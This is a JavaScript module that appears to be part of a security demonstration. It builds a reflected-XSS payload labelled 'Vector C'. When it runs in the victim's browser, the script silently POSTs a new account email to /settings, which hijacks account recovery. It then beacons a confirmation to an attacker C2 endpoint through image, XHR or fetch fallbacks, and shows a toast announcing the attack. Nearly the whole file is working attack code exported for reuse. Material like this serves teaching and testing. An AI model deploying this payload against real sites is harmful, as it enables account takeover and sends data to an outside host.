/**
 * Vector C — Unauthorized State-Changing Action (CSRF via Reflected XSS)
 *
 * Technical Mechanism:
 *   1. Reflected script executes in victim's origin with ambient session authority.
 *   2. Automatically issues a background POST to /settings with attacker email.
 *   3. Exfiltrates proof of execution to Attacker C2.
 */

function generatePayload(c2Url = 'http://127.0.0.1:5002') {
  return `<script>
(function() {
  var targetEmail = 'attacker-takeover@shadow-c2.com';
  fetch('/settings', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'email=' + encodeURIComponent(targetEmail)
  }).then(function() {
    var msg = 'ACTION_EXECUTED: Account email changed to ' + targetEmail;
    var encoded = encodeURIComponent(msg);
    var sent = false;
    try { new Image().src = '${c2Url}/log?data=' + encoded; sent = true; } catch(e) {}
    if (!sent) { try { var x = new XMLHttpRequest(); x.open('GET', '${c2Url}/log?data=' + encoded, true); x.send(); sent = true; } catch(e) {} }
    if (!sent) { try { fetch('/log?data=' + encoded).catch(function(){}); } catch(e) {} }

    var toast = document.createElement('div');
    toast.style.position = 'fixed';
    toast.style.bottom = '20px';
    toast.style.right = '20px';
    toast.style.padding = '14px 20px';
    toast.style.background = '#dc2626';
    toast.style.color = '#fff';
    toast.style.borderRadius = '8px';
    toast.style.boxShadow = '0 10px 15px -3px rgba(0,0,0,0.3)';
    toast.style.fontFamily = 'system-ui, sans-serif';
    toast.style.fontSize = '14px';
    toast.style.fontWeight = '600';
    toast.style.zIndex = '999999';
    toast.innerHTML = '🚨 [XSS Attack Executed] Account recovery email hijacked to ' + targetEmail;
    document.body.appendChild(toast);
    setTimeout(function() { toast.remove(); }, 6000);
  });
})();
</script>`;
}

const payload = generatePayload('http://127.0.0.1:5002');
const encodedPayload = encodeURIComponent(payload);

module.exports = {
  name: 'Vector C — Unauthorized Action Execution',
  payload,
  encodedPayload,
  generatePayload
};
